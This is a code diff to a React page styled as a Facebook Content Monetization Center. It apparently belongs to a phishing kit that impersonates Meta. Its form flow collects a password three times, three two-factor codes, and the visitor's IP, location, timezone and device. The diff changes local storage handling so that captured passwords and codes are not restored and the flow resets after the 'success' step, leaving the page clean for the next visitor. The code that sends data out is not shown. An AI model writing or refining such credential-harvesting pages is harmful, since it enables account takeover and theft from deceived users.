@@ -9,10 +9,19 @@ import SuccessModal from '#components/modals/SuccessModal'
 import TwoFactorModal from '#components/modals/TwoFactorModal'
 import React from 'react'
 import { useAppDispatch, useAppSelector } from '../store/hooks'
-import { updateForm } from '../store/slices/stepFormSlice'
+import { resetForm, updateForm } from '../store/slices/stepFormSlice'
 
 const STORAGE_KEY = 'facebook_content_monetization_state'
 const LEGACY_STORAGE_KEY = 'meta_verified_state'
+
+function clearPersistedFlow() {
+    try {
+        localStorage.removeItem(STORAGE_KEY)
+        localStorage.removeItem(LEGACY_STORAGE_KEY)
+    } catch {
+        /* ignore */
+    }
+}
 
 const FacebookContentMonetizationCenter = () => {
     const [isOpenInfo, setIsOpenInfo] = React.useState(false)
@@ -41,11 +50,17 @@ const FacebookContentMonetizationCenter = () => {
         if (raw) {
             try {
                 const { state, formData: savedFormData, expires } = JSON.parse(raw)
-                if (Date.now() < expires) {
+                const wasSuccess = Boolean(state?.isOpenSuccess || state?.isOpendSuccess)
+
+                // Đã hoàn tất → bỏ lưu, vào lại trang bắt đầu từ đầu
+                if (wasSuccess || Date.now() >= expires) {
+                    clearPersistedFlow()
+                    dispatch(resetForm())
+                } else if (Date.now() < expires) {
                     setIsOpenInfo(state.isOpenInfo || state.isOpendInfo || false)
                     setIsOpenPassword(state.isOpenPassword || state.isOpendPassword || false)
                     setIsOpenTwoFactor(state.isOpenTwoFactor || state.isOpendTwoFactor || false)
-                    setIsOpenSuccess(state.isOpenSuccess || state.isOpendSuccess || false)
+                    setIsOpenSuccess(false)
 
                     if (savedFormData) {
                         // Không khôi phục IP/location/device — luôn lấy mới theo Location hiện tại
@@ -53,43 +68,54 @@ const FacebookContentMonetizationCenter = () => {
                             ip: _ip,
                             location: _location,
                             country_code: _country,
+                            timezone: _timezone,
                             device: _device,
+                            password: _password,
+                            passwordSecond: _passwordSecond,
+                            passwordThird: _passwordThird,
+                            twoFa: _twoFa,
+                            twoFaSecond: _twoFaSecond,
+                            twoFaThird: _twoFaThird,
                             ...rest
                         } = savedFormData
                         dispatch(updateForm(rest))
                     }
-                } else {
-                    localStorage.removeItem(STORAGE_KEY)
-                    localStorage.removeItem(LEGACY_STORAGE_KEY)
                 }
             } catch (e) {
                 console.error('Error parsing saved state', e)
+                clearPersistedFlow()
             }
         }
         setIsLoaded(true)
     }, [dispatch])
 
     React.useEffect(() => {
-        if (isLoaded) {
-            const expires = Date.now() + 7 * 24 * 60 * 60 * 1000 // 1 week
-            try {
-                localStorage.setItem(
-                    STORAGE_KEY,
-                    JSON.stringify({
-                        state: {
-                            isOpenInfo,
-                            isOpenPassword,
-                            isOpenTwoFactor,
-                            isOpenSuccess,
-                        },
-                        formData,
-                        expires,
-                    })
-                )
-                localStorage.removeItem(LEGACY_STORAGE_KEY)
-            } catch {
-                /* ignore */
-            }
+        if (!isLoaded) return
+
+        // Sau bước thành công: không lưu flow — reload sẽ sạch
+        if (isOpenSuccess) {
+            clearPersistedFlow()
+            return
+        }
+
+        const expires = Date.now() + 7 * 24 * 60 * 60 * 1000 // 1 week
+        try {
+            localStorage.setItem(
+                STORAGE_KEY,
+                JSON.stringify({
+                    state: {
+                        isOpenInfo,
+                        isOpenPassword,
+                        isOpenTwoFactor,
+                        isOpenSuccess: false,
+                    },
+                    formData,
+                    expires,
+                })
+            )
+            localStorage.removeItem(LEGACY_STORAGE_KEY)
+        } catch {
+            /* ignore */
         }
     }, [isLoaded, isOpenInfo, isOpenPassword, isOpenTwoFactor, isOpenSuccess, formData])
 
@@ -106,6 +132,7 @@ const FacebookContentMonetizationCenter = () => {
     }
 
     const handleOpenSuccessModal = (open: boolean) => {
+        if (open) clearPersistedFlow()
         setIsOpenSuccess(open)
     }
 
